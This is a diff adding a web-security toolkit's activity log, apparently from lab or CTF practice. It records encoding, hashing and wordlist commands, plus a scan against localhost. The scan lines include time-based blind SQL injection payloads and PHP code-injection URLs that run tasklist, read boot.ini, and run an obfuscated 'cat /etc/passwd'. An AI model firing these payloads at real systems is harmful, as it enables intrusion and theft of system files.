@@ -1,0 +1,955 @@
+2015-11-13 18:42:20    enurl    ++++    %2B%2B%2B%2B  
+2015-11-13 18:42:20    enurl    ++++    %2B%2B%2B%2B  
+2015-11-13 18:42:21    deurl    ++++          
+2015-11-13 18:42:22    enurl    ++++    %2B%2B%2B%2B  
+2015-11-13 18:42:22    enurl    ++++    %2B%2B%2B%2B  
+2015-11-13 19:22:29    decoct    123    0173  
+2015-11-13 19:22:32    decbin    123    0b1111011  
+2015-11-13 19:22:37    md5md5    454654    c005a36382874313805dac362104eebc82874313805dac36  
+2015-11-13 20:08:06    getdict    0    files/list/weakpass/Èõ¿ÚÁî×Öµä.txt
+files/list/weakpass/¾«¼ò°æÈõ¿ÚÁî×Öµä.txt
+files/list/webback/all.txt
+files/list/webback/all2.txt
+files/list/webback/ASP.txt
+files/list/webback/ASPX.txt
+files/list/webback/buglist.txt
+files/list/webback/DIR.txt
+files/list/webback/JSP.txt
+files/list/webback/MDB.txt
+files/list/webback/PHP.txt
+files/list//ÐÂ½¨ÎÄ±¾ÎÄµµ.txt
+  
+2015-11-13 20:12:18    getdict    0    files/list/weakpass/Èõ¿ÚÁî×Öµä.txt
+files/list/weakpass/¾«¼ò°æÈõ¿ÚÁî×Öµä.txt
+files/list/webback/all.txt
+files/list/webback/all2.txt
+files/list/webback/ASP.txt
+files/list/webback/ASPX.txt
+files/list/webback/buglist.txt
+files/list/webback/DIR.txt
+files/list/webback/JSP.txt
+files/list/webback/MDB.txt
+files/list/webback/PHP.txt
+files/list//ÐÂ½¨ÎÄ±¾ÎÄµµ.txt
+  
+2015-11-13 20:12:43    getdict    0    files/list/weakpass/Èõ¿ÚÁî×Öµä.txt
+files/list/weakpass/¾«¼ò°æÈõ¿ÚÁî×Öµä.txt
+files/list/webback/all.txt
+files/list/webback/all2.txt
+files/list/webback/ASP.txt
+files/list/webback/ASPX.txt
+files/list/webback/buglist.txt
+files/list/webback/DIR.txt
+files/list/webback/JSP.txt
+files/list/webback/MDB.txt
+files/list/webback/PHP.txt
+files/list//ÐÂ½¨ÎÄ±¾ÎÄµµ.txt
+  
+2015-11-13 20:12:44    getdict    0    files/list/weakpass/Èõ¿ÚÁî×Öµä.txt
+files/list/weakpass/¾«¼ò°æÈõ¿ÚÁî×Öµä.txt
+files/list/webback/all.txt
+files/list/webback/all2.txt
+files/list/webback/ASP.txt
+files/list/webback/ASPX.txt
+files/list/webback/buglist.txt
+files/list/webback/DIR.txt
+files/list/webback/JSP.txt
+files/list/webback/MDB.txt
+files/list/webback/PHP.txt
+files/list//ÐÂ½¨ÎÄ±¾ÎÄµµ.txt
+  
+2015-11-13 20:13:05    getdict    0    files/list/weakpass/Èõ¿ÚÁî×Öµä.txt
+files/list/weakpass/¾«¼ò°æÈõ¿ÚÁî×Öµä.txt
+files/list/webback/all.txt
+files/list/webback/all2.txt
+files/list/webback/ASP.txt
+files/list/webback/ASPX.txt
+files/list/webback/buglist.txt
+files/list/webback/DIR.txt
+files/list/webback/JSP.txt
+files/list/webback/MDB.txt
+files/list/webback/PHP.txt
+files/list//ÐÂ½¨ÎÄ±¾ÎÄµµ.txt
+  
+2015-11-13 20:13:32    getdict    0    files/list/weakpass/Èõ¿ÚÁî×Öµä.txt
+files/list/weakpass/¾«¼ò°æÈõ¿ÚÁî×Öµä.txt
+files/list/webback/all.txt
+files/list/webback/all2.txt
+files/list/webback/ASP.txt
+files/list/webback/ASPX.txt
+files/list/webback/buglist.txt
+files/list/webback/DIR.txt
+files/list/webback/JSP.txt
+files/list/webback/MDB.txt
+files/list/webback/PHP.txt
+files/list//ÐÂ½¨ÎÄ±¾ÎÄµµ.txt
+  
+2015-11-13 20:15:48    getdict    0    files/list/weakpass/Èõ¿ÚÁî×Öµä.txt
+files/list/weakpass/¾«¼ò°æÈõ¿ÚÁî×Öµä.txt
+files/list/webback/all.txt
+files/list/webback/all2.txt
+files/list/webback/ASP.txt
+files/list/webback/ASPX.txt
+files/list/webback/buglist.txt
+files/list/webback/DIR.txt
+files/list/webback/JSP.txt
+files/list/webback/MDB.txt
+files/list/webback/PHP.txt
+files/list//ÐÂ½¨ÎÄ±¾ÎÄµµ.txt
+  
+2015-11-13 20:15:59    getdict    0    files/list/weakpass/Èõ¿ÚÁî×Öµä.txt
+files/list/weakpass/¾«¼ò°æÈõ¿ÚÁî×Öµä.txt
+files/list/webback/all.txt
+files/list/webback/all2.txt
+files/list/webback/ASP.txt
+files/list/webback/ASPX.txt
+files/list/webback/buglist.txt
+files/list/webback/DIR.txt
+files/list/webback/JSP.txt
+files/list/webback/MDB.txt
+files/list/webback/PHP.txt
+files/list//ÐÂ½¨ÎÄ±¾ÎÄµµ.txt
+  
+2015-11-13 20:25:12    backdict    0    files/list/webback//all.txt
+files/list/webback//all2.txt
+files/list/webback//ASP.txt
+files/list/webback//ASPX.txt
+files/list/webback//buglist.txt
+files/list/webback//DIR.txt
+files/list/webback//JSP.txt
+files/list/webback//MDB.txt
+files/list/webback//PHP.txt
+  
+2015-11-13 20:25:14    backdict    0    files/list/webback//all.txt
+files/list/webback//all2.txt
+files/list/webback//ASP.txt
+files/list/webback//ASPX.txt
+files/list/webback//buglist.txt
+files/list/webback//DIR.txt
+files/list/webback//JSP.txt
+files/list/webback//MDB.txt
+files/list/webback//PHP.txt
+  
+2015-11-13 20:25:15    backdict    0    files/list/webback//all.txt
+files/list/webback//all2.txt
+files/list/webback//ASP.txt
+files/list/webback//ASPX.txt
+files/list/webback//buglist.txt
+files/list/webback//DIR.txt
+files/list/webback//JSP.txt
+files/list/webback//MDB.txt
+files/list/webback//PHP.txt
+  
+2015-11-13 20:25:15    backdict    0    files/list/webback//all.txt
+files/list/webback//all2.txt
+files/list/webback//ASP.txt
+files/list/webback//ASPX.txt
+files/list/webback//buglist.txt
+files/list/webback//DIR.txt
+files/list/webback//JSP.txt
+files/list/webback//MDB.txt
+files/list/webback//PHP.txt
+  
+2015-11-13 20:40:01    backdict    0    files/list/webback//all.txt:files/list/webback//all2.txt:files/list/webback//ASP.txt:files/list/webback//ASPX.txt:files/list/webback//buglist.txt:files/list/webback//DIR.txt:files/list/webback//JSP.txt:files/list/webback//MDB.txt:files/list/webback//PHP.txt:  
+2015-11-13 20:40:36    backdict    0    files/list/webback//all.txt:files/list/webback//all2.txt:files/list/webback//ASP.txt:files/list/webback//ASPX.txt:files/list/webback//buglist.txt:files/list/webback//DIR.txt:files/list/webback//JSP.txt:files/list/webback//MDB.txt:files/list/webback//PHP.txt:  
+2015-11-13 20:46:07    backdict    0    files/list/webback//all.txt:files/list/webback//all2.txt:files/list/webback//ASP.txt:files/list/webback//ASPX.txt:files/list/webback//buglist.txt:files/list/webback//DIR.txt:files/list/webback//JSP.txt:files/list/webback//MDB.txt:files/list/webback//PHP.txt:  
+2015-11-13 20:47:17    backdict    0    files/list/webback//all.txt:files/list/webback//all2.txt:files/list/webback//ASP.txt:files/list/webback//ASPX.txt:files/list/webback//buglist.txt:files/list/webback//DIR.txt:files/list/webback//JSP.txt:files/list/webback//MDB.txt:files/list/webback//PHP.txt:  
+2015-11-13 20:47:49    backdict    0    files/list/webback//all.txt:files/list/webback//all2.txt:files/list/webback//ASP.txt:files/list/webback//ASPX.txt:files/list/webback//buglist.txt:files/list/webback//DIR.txt:files/list/webback//JSP.txt:files/list/webback//MDB.txt:files/list/webback//PHP.txt:  
+2015-11-13 20:49:37    backdict    0    files/list/webback//all.txt:files/list/webback//all2.txt:files/list/webback//ASP.txt:files/list/webback//ASPX.txt:files/list/webback//buglist.txt:files/list/webback//DIR.txt:files/list/webback//JSP.txt:files/list/webback//MDB.txt:files/list/webback//PHP.txt:  
+2015-11-13 20:50:03    backdict    0    files/list/webback//all.txt:files/list/webback//all2.txt:files/list/webback//ASP.txt:files/list/webback//ASPX.txt:files/list/webback//buglist.txt:files/list/webback//DIR.txt:files/list/webback//JSP.txt:files/list/webback//MDB.txt:files/list/webback//PHP.txt:  
+2015-11-13 20:50:40    backdict    0    files/list/webback//all.txt:files/list/webback//all2.txt:files/list/webback//ASP.txt:files/list/webback//ASPX.txt:files/list/webback//buglist.txt:files/list/webback//DIR.txt:files/list/webback//JSP.txt:files/list/webback//MDB.txt:files/list/webback//PHP.txt:  
+2015-11-13 20:51:20    backdict    0    files/list/webback//all.txt:files/list/webback//all2.txt:files/list/webback//ASP.txt:files/list/webback//ASPX.txt:files/list/webback//buglist.txt:files/list/webback//DIR.txt:files/list/webback//JSP.txt:files/list/webback//MDB.txt:files/list/webback//PHP.txt:  
+2015-11-13 20:51:21    backdict    0    files/list/webback//all.txt:files/list/webback//all2.txt:files/list/webback//ASP.txt:files/list/webback//ASPX.txt:files/list/webback//buglist.txt:files/list/webback//DIR.txt:files/list/webback//JSP.txt:files/list/webback//MDB.txt:files/list/webback//PHP.txt:  
+2015-11-13 20:51:42    backdict    0    files/list/webback//all.txt:files/list/webback//all2.txt:files/list/webback//ASP.txt:files/list/webback//ASPX.txt:files/list/webback//buglist.txt:files/list/webback//DIR.txt:files/list/webback//JSP.txt:files/list/webback//MDB.txt:files/list/webback//PHP.txt:  
+2015-11-13 20:52:21    backdict    0    files/list/webback//all.txt:files/list/webback//all2.txt:files/list/webback//ASP.txt:files/list/webback//ASPX.txt:files/list/webback//buglist.txt:files/list/webback//DIR.txt:files/list/webback//JSP.txt:files/list/webback//MDB.txt:files/list/webback//PHP.txt:  
+2015-11-13 20:52:25    backdict    0    files/list/webback//all.txt:files/list/webback//all2.txt:files/list/webback//ASP.txt:files/list/webback//ASPX.txt:files/list/webback//buglist.txt:files/list/webback//DIR.txt:files/list/webback//JSP.txt:files/list/webback//MDB.txt:files/list/webback//PHP.txt:  
+2015-11-13 20:53:23    backdict    0    files/list/webback//all.txt:files/list/webback//all2.txt:files/list/webback//ASP.txt:files/list/webback//ASPX.txt:files/list/webback//buglist.txt:files/list/webback//DIR.txt:files/list/webback//JSP.txt:files/list/webback//MDB.txt:files/list/webback//PHP.txt:  
+2015-11-13 20:53:25    backdict    0    files/list/webback//all.txt:files/list/webback//all2.txt:files/list/webback//ASP.txt:files/list/webback//ASPX.txt:files/list/webback//buglist.txt:files/list/webback//DIR.txt:files/list/webback//JSP.txt:files/list/webback//MDB.txt:files/list/webback//PHP.txt:  
+2015-11-13 20:53:29    backdict    0    files/list/webback//all.txt:files/list/webback//all2.txt:files/list/webback//ASP.txt:files/list/webback//ASPX.txt:files/list/webback//buglist.txt:files/list/webback//DIR.txt:files/list/webback//JSP.txt:files/list/webback//MDB.txt:files/list/webback//PHP.txt:  
+2015-11-13 20:57:36    backdict    0    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-11-13 21:00:37    backdict    0    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-11-13 21:02:35    backdict    0    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-11-13 21:02:56    backdict    0    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-11-13 21:04:29    backdict    0    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-11-13 21:04:33    backdict    0    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-11-13 21:04:34    backdict    0    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-11-13 21:04:48    backdict    0    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-11-13 21:05:12    backdict    0    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-11-13 21:06:27    backdict    0    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-11-13 21:06:50    backdict    0    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-11-13 21:07:17    backdict    0    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-11-13 21:07:37    backdict    0    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-11-13 21:07:47    backdict    0    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-11-13 21:08:00    backdict    0    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-11-14 15:22:49    deurl    1%20AND%209770%3DIF%28%28EXISTS%28SELECT%20newpms%20FROM%20test.users%29%29%2CSLEEP%285%29%2C9770%29    1 AND 9770=IF((EXISTS(SELECT newpms FROM test.users)),SLEEP(5),9770)  
+2015-11-14 15:26:05    deurl    /phpcode/rctf/misc/index.php?id=1%20AND%209847%3DIF%28%28EXISTS%28SELECT%20eta%20FROM%20test.users%29%29%2CSLEEP%285%29%2C9847%29    /phpcode/rctf/misc/index.php?id=1 AND 9847=IF((EXISTS(SELECT eta FROM test.users)),SLEEP(5),9847)  
+2015-11-14 15:26:56    deurl    /phpcode/rctf/misc/index.php?id=1%20AND%205927%3DIF%28%28EXISTS%28SELECT%20pnds%20FROM%20test.users%29%29%2CSLEEP%285%29%2C5927%29    /phpcode/rctf/misc/index.php?id=1 AND 5927=IF((EXISTS(SELECT pnds FROM test.users)),SLEEP(5),5927)  
+2015-11-14 15:28:21    deurl    /phpcode/rctf/misc/index.php?id=1%20AND%208366%3DIF%28%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28column_name%29%20AS%20CHAR%29%2C0x20%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D0x7573657273%20AND%20table_schema%3D0x74657374%29%2C1%2C1%29%29%3E51%29%2CSLEEP%285%29%2C8366%29    /phpcode/rctf/misc/index.php?id=1 AND 8366=IF((ORD(MID((SELECT IFNULL(CAST(COUNT(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x74657374),1,1))>51),SLEEP(5),8366)  
+2015-11-14 15:29:03    deurl    http://192.168.52.136/phpmyadmin/tbl_structure.php?db=test&amp;token=b95affb6f3dfa0bc9c089d9600f9a4d8&amp;table=users&amp;phpMyAdmin=h0a0i088o3cb65o1621ukpkn77    http://192.168.52.136/phpmyadmin/tbl_structure.php?db=test&amp;token=b95affb6f3dfa0bc9c089d9600f9a4d8&amp;table=users&amp;phpMyAdmin=h0a0i088o3cb65o1621ukpkn77  
+2015-11-14 15:41:32    debase64    IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyN=    #############################################################################  
+2015-11-14 15:41:52    debase64    IyAJCQkJRG9jdW1lbnRhdGlvbgkJCQkgICAgI0==    # 				Documentation				    #  
+2015-11-16 09:31:01    {"cmd":"enbase64","msg":{"msg":"123132165465"},"token":"7654123"}    MTIzMTMyMTY1NDY1  
+2015-11-16 09:32:17    {"cmd":"enbase64","msg":{"msg":"123132165465"},"token":"7654123"}    MTIzMTMyMTY1NDY1  
+2015-11-16 09:32:18    {"cmd":"enbase64","msg":{"msg":"123132165465"},"token":"7654123"}    MTIzMTMyMTY1NDY1  
+2015-11-16 09:32:19    {"cmd":"enbase64","msg":{"msg":"123132165465"},"token":"7654123"}    MTIzMTMyMTY1NDY1  
+2015-11-16 09:35:04    {"cmd":"enbase64","msg":{"msg":"MTIzMTMyMTY1NDY1"},"token":"7654123"}    TVRJek1UTXlNVFkxTkRZMQ==  
+2015-11-16 09:36:24    {"cmd":"debase64","msg":{"msg":"MTIzMTMyMTY1NDY1"},"token":"7654123"}    123132165465  
+2015-11-16 09:38:31    {"cmd":"enbase64","msg":{"msg":"MTIzMTMyMTY1NDY1"},"token":"7654123"}    TVRJek1UTXlNVFkxTkRZMQ==  
+2015-11-16 09:38:32    {"cmd":"enbase64","msg":{"msg":"MTIzMTMyMTY1NDY1"},"token":"7654123"}    TVRJek1UTXlNVFkxTkRZMQ==  
+2015-11-16 09:38:33    {"cmd":"enbase64","msg":{"msg":"MTIzMTMyMTY1NDY1"},"token":"7654123"}    TVRJek1UTXlNVFkxTkRZMQ==  
+2015-11-16 09:38:33    {"cmd":"enbase64","msg":{"msg":"MTIzMTMyMTY1NDY1"},"token":"7654123"}    TVRJek1UTXlNVFkxTkRZMQ==  
+2015-11-16 09:38:34    {"cmd":"enbase64","msg":{"msg":"MTIzMTMyMTY1NDY1"},"token":"7654123"}    TVRJek1UTXlNVFkxTkRZMQ==  
+2015-11-16 09:38:35    {"cmd":"enbase64","msg":{"msg":"MTIzMTMyMTY1NDY1"},"token":"7654123"}    TVRJek1UTXlNVFkxTkRZMQ==  
+2015-11-16 09:38:35    {"cmd":"enbase64","msg":{"msg":"MTIzMTMyMTY1NDY1"},"token":"7654123"}    TVRJek1UTXlNVFkxTkRZMQ==  
+2015-11-16 09:38:39    {"cmd":"enbase64","msg":{"msg":"MTIzMTMyMTY1NDY1"},"token":"7654123"}    TVRJek1UTXlNVFkxTkRZMQ==  
+2015-11-16 09:38:39    {"cmd":"enbase64","msg":{"msg":"MTIzMTMyMTY1NDY1"},"token":"7654123"}    TVRJek1UTXlNVFkxTkRZMQ==  
+2015-11-16 09:38:40    {"cmd":"enbase64","msg":{"msg":"MTIzMTMyMTY1NDY1"},"token":"7654123"}    TVRJek1UTXlNVFkxTkRZMQ==  
+2015-11-16 09:38:40    {"cmd":"enbase64","msg":{"msg":"MTIzMTMyMTY1NDY1"},"token":"7654123"}    TVRJek1UTXlNVFkxTkRZMQ==  
+2015-11-16 09:38:41    {"cmd":"enbase64","msg":{"msg":"MTIzMTMyMTY1NDY1"},"token":"7654123"}    TVRJek1UTXlNVFkxTkRZMQ==  
+2015-11-16 09:50:19    {"cmd":"enbase64","msg":{"msg":"123132654"},"token":"7654123"}    MTIzMTMyNjU0  
+2015-11-16 09:50:27    {"cmd":"debase64","msg":{"msg":"MTIzMTMyNjU0"},"token":"7654123"}    123132654  
+2015-11-16 09:56:03    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-11-16 09:56:29    {"cmd":"md5md5","msg":{"msg":"65464156"},"token":"7654123"}    107d590ca2996236cab5a81e898cbad3a2996236cab5a81e  
+2015-11-16 09:56:31    {"cmd":"md5md5","msg":{"msg":"65464156"},"token":"7654123"}    107d590ca2996236cab5a81e898cbad3a2996236cab5a81e  
+2015-11-16 09:56:31    {"cmd":"md5md5","msg":{"msg":"65464156"},"token":"7654123"}    107d590ca2996236cab5a81e898cbad3a2996236cab5a81e  
+2015-11-16 09:56:32    {"cmd":"md5md5","msg":{"msg":"65464156"},"token":"7654123"}    107d590ca2996236cab5a81e898cbad3a2996236cab5a81e  
+2015-11-16 09:56:36    {"cmd":"md5md5","msg":{"msg":"65464156"},"token":"7654123"}    107d590ca2996236cab5a81e898cbad3a2996236cab5a81e  
+2015-11-16 14:04:17    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-11-16 14:04:49    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-11-16 14:07:03    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-11-16 14:07:04    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-11-16 14:07:09    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-11-16 14:07:11    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-11-16 14:07:14    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-11-16 14:07:44    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-11-16 14:09:11    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-11-16 14:09:12    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-11-16 14:09:13    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-11-16 14:09:14    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-11-16 14:09:15    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-11-16 14:09:15    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-11-16 14:09:16    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-11-16 14:09:16    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-11-16 14:09:17    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-11-16 14:09:18    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-11-16 14:09:18    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-11-16 14:09:18    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-11-16 14:09:19    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-11-16 14:09:19    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-11-16 14:09:20    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-11-16 14:09:22    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-11-16 14:09:22    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-11-16 14:09:23    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-11-16 14:09:24    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-11-16 14:10:09    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-11-16 14:19:09    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-11-16 14:23:01    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-11-16 14:23:04    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-11-16 14:46:47    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-11-16 14:47:06    {"cmd":"burstback","msg":{"url":"localhost","dict":"all.txt"},"token":"7654123"}    http://localhost/index.php/*123*/'union/**/select/**
+http://localhost/index.php/*123*/'union/**/select/**/1"
+http://localhost/index.php/*123*/'union/**/select/**/1234568md5(8855815)1011%23&action=getatlbyids
+http://localhost/index.php/*123*/'union/**/select/**/1234568md5(8855815)1011%23&action=getatlbyid~
+http://localhost/index.php/Index/index/name
+http://localhost/index.php/Index/index/name/${@print(md5(1122))}s
+http://localhost/index.php/Index/index/name/${@print(md5(1122))}~
+http://localhost/index.php/admin/
+http://localhost/index.php/admin/authentication/sa
+http://localhost/index.php/admin/authentication/sa/login
+http://localhost/index.php/admin/authentication/sa/logins
+http://localhost/index.php/admin/authentication/sa/login~
+http://localhost/index.php/admin/authentication/sa/notexist_path
+http://localhost/index.php/admin/authentication/sa/notexist_paths
+http://localhost/index.php/admin/authentication/sa/notexist_path~
+http://localhost/index.php/admin/s
+http://localhost/index.php/admin/~
+http://localhost/index.php/ajax/api/reputation
+http://localhost/index.php/ajax/api/reputation/vote/
+http://localhost/index.php/ajax/api/reputation/vote/s
+http://localhost/index.php/ajax/api/reputation/vote/~
+http://localhost/index.php/api
+http://localhost/index.php/api/xmlrpc
+http://localhost/index.php/api/xmlrpcs
+http://localhost/index.php/api/xmlrpc~
+http://localhost/index.php/cms
+http://localhost/index.php/cms/item-comment
+http://localhost/index.php/cms/item-comments
+http://localhost/index.php/cms/item-comment~
+http://localhost/index.php/list-10%20UNION/**/all/**/SELECT/**
+http://localhost/index.php/module/action/param1
+http://localhost/index.php/module/action/param1/${@print(chr(126).chr(126).chr(126).`tasklist`.chr(126).chr(126).chr(126))}
+http://localhost/index.php/module/action/param1/${@print(chr(126).chr(126).chr(126).`tasklist`.chr(126).chr(126).chr(126))}s
+http://localhost/index.php/module/action/param1/${@print(chr(126).chr(126).chr(126).`tasklist`.chr(126).chr(126).chr(126))}~
+http://localhost/index.php/module/action/param1/${@print(chr(126).chr(126).chr(126).file_get_contents(c.chr(58).chr(92).boot.chr(46).ini).chr(126).chr(126).chr(126))}
+http://localhost/index.php/module/action/param1/${@print(chr(126).chr(126).chr(126).file_get_contents(c.chr(58).chr(92).boot.chr(46).ini).chr(126).chr(126).chr(126))}s
+http://localhost/index.php/module/action/param1/${@print(chr(126).chr(126).chr(126).file_get_contents(c.chr(58).chr(92).boot.chr(46).ini).chr(126).chr(126).chr(126))}~
+http://localhost/index.php/module/action/param1/${@print(md5(0.204910492051))}
+http://localhost/index.php/module/action/param1/${@print(md5(0.204910492051))}s
+http://localhost/index.php/module/action/param1/${@print(md5(0.204910492051))}~
+http://localhost/index.php/module/action/param1/${@print(md5(0.684747658043))}
+http://localhost/index.php/module/action/param1/${@print(md5(0.684747658043))}s
+http://localhost/index.php/module/action/param1/${@print(md5(0.684747658043))}~
+http://localhost/index.php/module/action/param1/{${print(chr(126).chr(126).chr(126))}}${@print(system(chr(99).chr(97).chr(116).chr(32).chr(47).chr(101).chr(116).chr(99).chr(47).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100)))}{${print(chr(126).chr(126).chr(126))}}
+http://localhost/index.php/module/action/param1/{${print(chr(126).chr(126).chr(126))}}${@print(system(chr(99).chr(97).chr(116).chr(32).chr(47).chr(101).chr(116).chr(99).chr(47).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100)))}{${print(chr(126).chr(126).chr(126))}}s
